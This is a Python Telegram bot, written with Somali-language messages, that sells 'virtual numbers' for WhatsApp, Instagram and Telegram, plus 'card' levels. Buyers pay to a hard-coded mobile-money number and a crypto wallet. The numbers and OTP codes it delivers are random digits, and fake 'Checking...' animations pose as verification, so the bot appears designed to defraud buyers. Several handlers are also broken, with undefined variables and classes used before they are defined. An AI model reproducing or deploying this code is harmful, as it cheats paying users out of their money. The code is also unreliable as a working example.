import os
import asyncio
import random
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command, StateFilter
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.client.default import DefaultBotProperties

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

LOCAL_NUMBER = "+252907868526"
BNB_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
USDT_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

# ================= DATA STORAGE =================
users = {}

# ================= STATES =================
class VirtualState(StatesGroup):
    waiting_screenshot = State()

class CardState(StatesGroup):
    screenshot = State()

class WithdrawState(StatesGroup):
    waiting_info = State()

# ================= HELPERS =================
def random_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def generate_otp():
    return "".join(random.choices("0123456789", k=6))

def generate_referral_code():
    return "".join(str(random.randint(0, 9)) for _ in range(8))

async def live_animation(msg: Message, text="Checking", seconds=5):
    for i in range(seconds):
        dots = "." * (i % 4)
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}{dots}")

# ================= START ==================
@dp.message(Command("start"))
async def start(msg: Message):
    uid = msg.from_user.id
    if uid not in users:
        referral_code = generate_referral_code()
        users[uid] = {
            "balance": 0.0,
            "referral_code": referral_code,
            "referrals": []
        }

    # Referral link
    args = msg.get_args()
    if args:
        ref_code = args.strip()
        for user_id, data in users.items():
            if data["referral_code"] == ref_code and uid not in data["referrals"]:
                data["referrals"].append(uid)
                data["balance"] += 0.6
                await bot.send_message(user_id, f"🎉 Qof cusub ayaa ku soo biiray! $0.6 ayaa lagu daray balance-kaaga.")
                break

    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="New Order"), KeyboardButton(text="Customer")],
            [KeyboardButton(text="Balance"), KeyboardButton(text="Referral")],
            [KeyboardButton(text="Withdraw")]
        ],
        resize_keyboard=True
    )
    await msg.answer(f"Ku soo dhawoow Service Bot 🤖\nYour Referral Code: {users[uid]['referral_code']}\nBalance: ${users[uid]['balance']:.2f}", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual_start")],
        [InlineKeyboardButton(text="CARD", callback_data="card_start")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= CUSTOMER =================
@dp.message(F.text == "Customer")
async def customer_support(msg: Message):
    await msg.answer("Customer Support 👇\n\nFadlan la xiriir:\n@scholes1")

    # ================== VIRTUAL FLOW =================
@dp.callback_query(F.data == "virtual_start")
async def virtual_platform(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WHATSAPP", callback_data="v_platform_WHATSAPP")],
        [InlineKeyboardButton(text="INSTAGRAM", callback_data="v_platform_INSTAGRAM")],
        [InlineKeyboardButton(text="TELEGRAM", callback_data="v_platform_TELEGRAM")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_platform_"))
async def virtual_platform_selected(call: CallbackQuery):
    platform = call.data.split("_")[2]
    number = random_number()

    users[call.from_user.id].update({
        "type": "virtual",
        "platform": platform,
        "number": number,
        "price": "$0.8"
    })

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_payment_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_payment_crypto")]
    ])

    await call.message.edit_text(
        f"Number: {number}\nQiimaha: $0.8\nDooro Payment:",
        reply_markup=kb
    )

# ================= VIRTUAL LOCAL PAYMENT =================
@dp.callback_query(F.data == "v_payment_local")
async def virtual_local_payment(call: CallbackQuery):
    uid = call.from_user.id
    data = users.get(uid, {})

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"v_confirm_payment_{uid}")]
    ])

    await call.message.edit_text(
        f"Lacagta ku dir:\n\n{LOCAL_NUMBER}\n"
        f"Lambarkaaga: {data.get('number')}\nQiimaha: {data.get('price')}",
        reply_markup=kb
    )

# ================= CONFIRM LOCAL =================
@dp.callback_query(F.data.startswith("v_confirm_payment_"))
async def confirm_virtual_payment(call: CallbackQuery, state: FSMContext):
    await call.message.edit_text("Checking...")
    await live_animation(call.message)
    await call.message.answer("Soo dir Screenshot-ka Payment-ka")
    await state.set_state(VirtualState.waiting_screenshot)

# ================= RECEIVE VIRTUAL SCREENSHOT =================
@dp.message(StateFilter(VirtualState.waiting_screenshot), F.photo)
async def receive_virtual_screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    data = users.get(uid, {})

    users[uid]["screenshot"] = msg.photo[-1].file_id
    await msg.answer("Waad mahadsantahay. Dalabkaaga waa la hubinayaa.")

    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}"),
            InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}"),
            InlineKeyboardButton(text="OTP", callback_data=f"admin_otp_{uid}")
        ]
    ])

    caption = (
        f"New Virtual Order\n"
        f"User: {uid}\n"
        f"Platform: {data.get('platform')}\n"
        f"Number: {data.get('number')}\n"
        f"Payment: LOCAL/CRYPTO"
    )

    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, reply_markup=kb_admin)
    await state.clear()

# ================= VIRTUAL CRYPTO PAYMENT =================
@dp.callback_query(F.data == "v_payment_crypto")
async def virtual_crypto_payment(call: CallbackQuery):
    uid = call.from_user.id
    data = users.get(uid, {})

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"v_crypto_confirm_{uid}")]
    ])

    text = (
        f"💰 Dir Crypto:\n\n"
        f"USDT: <code>{USDT_ADDRESS}</code>\n"
        f"BNB: <code>{BNB_ADDRESS}</code>\n\n"
        f"Lambarkaaga: {data.get('number')}\n"
        f"Qiimaha: {data.get('price')}"
    )

    await call.message.edit_text(text, reply_markup=kb)

# ================= CONFIRM CRYPTO =================
@dp.callback_query(F.data.startswith("v_crypto_confirm_"))
async def confirm_crypto(call: CallbackQuery, state: FSMContext):
    await call.message.edit_text("Checking Crypto Payment...")
    await live_animation(call.message)
    await call.message.answer("Soo dir Screenshot-ka Crypto Payment-ka")
    await state.set_state(VirtualState.waiting_screenshot)

# ================= ADMIN CONFIRM =================
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[2])

    await bot.send_message(
        uid,
        f"✅ Payment Confirmed\n\n"
        f"Number: {users[uid]['number']}\n"
        f"Platform: {users[uid]['platform']}\n"
        f"Status: PAID ✅"
    )

    await call.message.edit_caption("✅ PAYMENT CONFIRMED")


# ================= ADMIN REJECT =================
@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[2])

    await bot.send_message(
        uid,
        "❌ Payment lama xaqiijin. Fadlan dib u dir lacagta."
    )

    await call.message.edit_caption("❌ PAYMENT REJECTED")
    users.pop(uid, None)


# ================= ADMIN SEND OTP =================
@dp.callback_query(F.data.startswith("admin_otp_"))
async def admin_send_otp(call: CallbackQuery):
    uid = int(call.data.split("_")[2])

    otp = generate_otp()
    users[uid]["otp"] = otp
    users[uid]["otp_requests"] = 0

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="SHOW OTP", callback_data="show_otp_user")]
    ])

    await bot.send_message(
        uid,
        f"Number: {users[uid]['number']}\n"
        f"Platform: {users[uid]['platform']}\n"
        f"PAYMENT: PAID ✅",
        reply_markup=kb
    )

    await call.message.edit_caption("OTP sent to user")


# ================= USER SHOW OTP =================
@dp.callback_query(F.data == "show_otp_user")
async def show_otp(call: CallbackQuery):
    uid = call.from_user.id
    otp = users.get(uid, {}).get("otp")

    if not otp:
        await call.message.edit_text("❌ OTP lama helin.")
        return

    msg = await call.message.edit_text("OTP Loading...")
    await live_animation(msg, "OTP")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]
    ])

    await msg.edit_text(f"OTP Code:\n\n<code>{otp}</code>", reply_markup=kb)


# ================= USER CHECK AGAIN =================
@dp.callback_query(F.data == "check_again_otp")
async def check_again(call: CallbackQuery):
    uid = call.from_user.id

    users[uid]["otp_requests"] += 1
    new_otp = generate_otp()
    users[uid]["otp"] = new_otp

    msg = await call.message.edit_text("Generating new OTP...")
    await live_animation(msg, "OTP")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]
    ])

    await msg.edit_text(f"NEW OTP:\n\n<code>{new_otp}</code>", reply_markup=kb)

    # Haddii user codsado 2 jeer
    if users[uid]["otp_requests"] == 2:
        kb_admin = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="CONFIRM FINAL OTP", callback_data=f"admin_final_confirm_{uid}")]
        ])

        await bot.send_message(
            ADMIN_ID,
            f"User {uid} requested OTP 2 times.",
            reply_markup=kb_admin
        )


# ================= ADMIN FINAL CONFIRM =================
@dp.callback_query(F.data.startswith("admin_final_confirm_"))
async def admin_final_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    final_otp = users[uid]["otp"]

    await bot.send_message(
        uid,
        f"✅ OTP Final Confirmed\n\n<code>{final_otp}</code>\nPayment Verified."
    )

    await call.message.edit_text(f"✅ User {uid} OTP Final Confirmed")

# ================= CARD START =================
@dp.callback_query(F.data == "card_start")
async def card_start(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LEVEL 1", callback_data="card_level_1")],
        [InlineKeyboardButton(text="LEVEL 2", callback_data="card_level_2")]
    ])
    await call.message.edit_text("Dooro Card Level:", reply_markup=kb)


# ================= SELECT CARD LEVEL =================
@dp.callback_query(F.data.startswith("card_level_"))
async def card_level_selected(call: CallbackQuery):
    level = call.data.split("_")[-1]
    number = random_number()

    users[call.from_user.id] = {
        "type": "card",
        "card_type": f"LEVEL {level}",
        "number": number,
        "price": "$5"
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="card_payment_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="card_payment_crypto")]
    ])

    await call.message.edit_text(
        f"Card Level: LEVEL {level}\n"
        f"Number: {number}\n"
        f"Qiimaha: $5\n\n"
        f"Dooro Payment:",
        reply_markup=kb
    )


# ================= CARD LOCAL PAYMENT =================
@dp.callback_query(F.data == "card_payment_local")
async def card_payment_local(call: CallbackQuery):
    uid = call.from_user.id
    data = users.get(uid)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"card_confirm_payment_{uid}")]
    ])

    await call.message.edit_text(
        f"Lacagta ku dir:\n\n{LOCAL_NUMBER}\n\n"
        f"Number: {data['number']}\n"
        f"Level: {data['card_type']}\n"
        f"Qiimaha: {data['price']}",
        reply_markup=kb
    )


# ================= CARD CRYPTO PAYMENT =================
@dp.callback_query(F.data == "card_payment_crypto")
async def card_payment_crypto(call: CallbackQuery):
    uid = call.from_user.id
    data = users.get(uid)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"card_confirm_payment_{uid}")]
    ])

    await call.message.edit_text(
        f"Dir Crypto:\n\n"
        f"USDT: <code>{USDT_ADDRESS}</code>\n"
        f"BNB: <code>{BNB_ADDRESS}</code>\n\n"
        f"Number: {data['number']}\n"
        f"Level: {data['card_type']}\n"
        f"Qiimaha: {data['price']}",
        reply_markup=kb
    )


# ================= CARD CONFIRM =================
@dp.callback_query(F.data.startswith("card_confirm_payment_"))
async def card_confirm(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Checking Payment...")
    await live_animation(msg)

    await call.message.answer("Soo dir Screenshot-ka Payment-ka")
    await state.set_state(CardState.screenshot)


# ================= RECEIVE CARD SCREENSHOT =================
@dp.message(StateFilter(CardState.screenshot), F.photo)
async def receive_card_screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    data = users.get(uid)

    users[uid]["screenshot"] = msg.photo[-1].file_id

    await msg.answer("Waad mahadsantahay. Dalabkaaga waa la hubinayaa.")

    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_card_confirm_{uid}"),
            InlineKeyboardButton(text="REJECT", callback_data=f"admin_card_reject_{uid}"),
            InlineKeyboardButton(text="ASK", callback_data=f"admin_card_ask_{uid}")
        ]
    ])

    caption = (
        f"New CARD Order\n\n"
        f"User: {uid}\n"
        f"Level: {data['card_type']}\n"
        f"Number: {data['number']}\n"
        f"Price: {data['price']}"
    )

    await bot.send_photo(
        ADMIN_ID,
        msg.photo[-1].file_id,
        caption=caption,
        reply_markup=kb_admin
    )

    await state.clear()


# ================= ADMIN CONFIRM CARD =================
@dp.callback_query(F.data.startswith("admin_card_confirm_"))
async def admin_card_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[-1])
    data = users.get(uid)

    await bot.send_message(
        uid,
        f"✅ Payment Confirmed!\n\n"
        f"Number: {data['number']}\n"
        f"Level: {data['card_type']}\n"
        f"Status: PAID ✅"
    )

    await call.message.edit_caption("✅ CARD PAYMENT CONFIRMED")


# ================= ADMIN REJECT CARD =================
@dp.callback_query(F.data.startswith("admin_card_reject_"))
async def admin_card_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[-1])

    await bot.send_message(
        uid,
        "❌ Payment lama xaqiijin. Fadlan dib u dir lacagta."
    )

    await call.message.edit_caption("❌ CARD PAYMENT REJECTED")
    users.pop(uid, None)


# ================= ADMIN ASK CARD =================
@dp.callback_query(F.data.startswith("admin_card_ask_"))
async def admin_card_ask(call: CallbackQuery):
    uid = int(call.data.split("_")[-1])

    await bot.send_message(
        uid,
        "ℹ️ Admin ayaa kula soo xiriiri doona si dalabka loo dhamaystiro."
    )

    await call.message.edit_caption("⚠️ ADMIN REQUESTED USER")

# ================= WITHDRAWAL REQUEST =================
@dp.message(F.text == "Withdraw")
async def request_withdraw(msg: Message):
    uid = msg.from_user.id
    user_data = users.get(uid)
    if not user_data or user_data.get("balance", 0) <= 0:
        await msg.answer("❌ Ma haysid balance aad ka baxdo.")
        return

    await msg.answer(f"Fadlan gali amount-ka aad ka baxayso (Max: ${user_data['balance']:.2f}):")
    await state.set_state(WithdrawState.waiting_amount)


# ================= STATES =================
class WithdrawState(StatesGroup):
    waiting_amount = State()


# ================= RECEIVE WITHDRAW AMOUNT =================
@dp.message(StateFilter(WithdrawState.waiting_amount))
async def receive_withdraw_amount(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    amount_text = msg.text.strip()
    try:
        amount = float(amount_text)
    except ValueError:
        await msg.answer("❌ Fadlan gali number sax ah.")
        return

    user_balance = users[uid].get("balance", 0)
    if amount > user_balance:
        await msg.answer(f"❌ Amount ka weyn balance-kaaga (${user_balance:.2f}).")
        return

    # Save request
    users[uid]["withdraw_request"] = amount

    # Send request to admin
    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="APPROVE", callback_data=f"admin_withdraw_approve_{uid}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"admin_withdraw_reject_{uid}")]
    ])

    await bot.send_message(
        ADMIN_ID,
        f"💰 Withdraw Request\nUser: {uid}\nAmount: ${amount:.2f}",
        reply_markup=kb_admin
    )

    await msg.answer("✅ Codsigaaga waxaa loo diray admin-ka. Sug jawaab.")
    await state.clear()


# ================= ADMIN APPROVE/REJECT WITHDRAW =================
@dp.callback_query(F.data.startswith("admin_withdraw_approve_"))
async def admin_approve_withdraw(call: CallbackQuery):
    uid = int(call.data.split("_")[-1])
    amount = users[uid].get("withdraw_request", 0)

    users[uid]["balance"] -= amount
    users[uid].pop("withdraw_request", None)

    await bot.send_message(uid, f"✅ Codsigaaga withdraw ${amount:.2f} waa la ogolaaday.")
    await call.message.edit_text(f"✅ Withdraw Approved for User {uid} (${amount:.2f})")


@dp.callback_query(F.data.startswith("admin_withdraw_reject_"))
async def admin_reject_withdraw(call: CallbackQuery):
    uid = int(call.data.split("_")[-1])
    amount = users[uid].get("withdraw_request", 0)
    users[uid].pop("withdraw_request", None)

    await bot.send_message(uid, f"❌ Codsigaaga withdraw ${amount:.2f} waa la diiday.")
    await call.message.edit_text(f"❌ Withdraw Rejected for User {uid} (${amount:.2f})")


# ================= ADMIN ADD BALANCE =================
@dp.message(F.text == "Add Balance")
async def admin_add_balance(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return
    await msg.answer("Fadlan gali User ID iyo amount, format: <user_id> <amount>")
    await state.set_state(AdminAddBalanceState.waiting_input)


class AdminAddBalanceState(StatesGroup):
    waiting_input = State()


@dp.message(StateFilter(AdminAddBalanceState.waiting_input))
async def admin_receive_add_balance(msg: Message, state: FSMContext):
    try:
        parts = msg.text.strip().split()
        uid = int(parts[0])
        amount = float(parts[1])
    except:
        await msg.answer("❌ Format khalad. Tusaale: 123456789 10.5")
        return

    if uid not in users:
        await msg.answer("❌ User ma jiro.")
        return

    users[uid]["balance"] += amount
    await msg.answer(f"✅ ${amount:.2f} ayaa lagu daray User {uid} balance-ka.")
    await bot.send_message(uid, f"💰 Balance-kaaga waxaa lagu daray ${amount:.2f} by Admin.")
    await state.clear()


# ================= MAIN RUN LOOP =================
async def main():
    logging.info("Bot is starting...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
